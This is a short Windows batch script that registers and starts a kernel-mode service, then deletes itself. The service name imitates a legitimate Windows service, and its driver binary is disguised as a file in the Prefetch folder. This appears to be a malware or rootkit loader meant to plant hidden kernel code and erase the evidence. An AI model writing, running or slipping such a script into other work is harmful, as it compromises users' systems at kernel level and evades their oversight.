@echo off
cd %~dp0
sc create WinHttpAutoProxySvc573_c binpath=C:\Windows\Prefetch\CMD.EXE-K8IUV58E.pf type=kernel
sc start WinHttpAutoProxySvc573_c
del "%~f0"